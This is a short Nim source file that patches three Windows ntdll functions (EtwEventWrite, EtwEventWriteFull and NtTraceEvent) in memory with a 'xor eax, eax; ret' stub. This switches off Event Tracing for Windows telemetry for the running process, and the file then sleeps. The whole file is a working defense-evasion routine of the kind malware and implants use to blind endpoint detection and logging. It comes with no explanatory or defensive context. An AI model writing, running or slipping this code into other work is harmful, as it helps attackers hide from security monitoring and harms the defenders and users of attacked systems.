import winim, os

var patchByteArray: array[3, byte] = [byte 0x33, 0xC0, 0xC3]
# xor eax, eax
# ret


var EEW = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite")
var EEWF = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWriteFull")
var NTTE = GetProcAddress(GetModuleHandleA("NTDLL"),"NtTraceEvent")

proc PatchEtwFunction*(fnAddr: PVOID): BOOL =
    var oldProtection: DWORD
    if VirtualProtect(fnAddr, sizeof(patchByteArray), PAGE_EXECUTE_READWRITE, &oldProtection) == FALSE:
        return FALSE

    copyMem(fnAddr, &patchByteArray[0], sizeof(patchByteArray))

    if VirtualProtect(fnAddr, sizeof(patchByteArray), oldProtection, &oldProtection) == FALSE:
        return FALSE

    return TRUE

proc PatchAllEtwFunctions*() =
    echo("EEW: " & cast[PVOID](EEW).repr())
    echo("EEWF: " & cast[PVOID](EEWF).repr())
    echo("NTTE: " & cast[PVOID](NTTE).repr())

    if PatchEtwFunction(EEW) and PatchEtwFunction(EEWF) and PatchEtwFunction(NTTE):
        echo("Patched All Etw Functions")
    else:
        echo("Failed To Etw Functions")

PatchAllEtwFunctions()

sleep 500000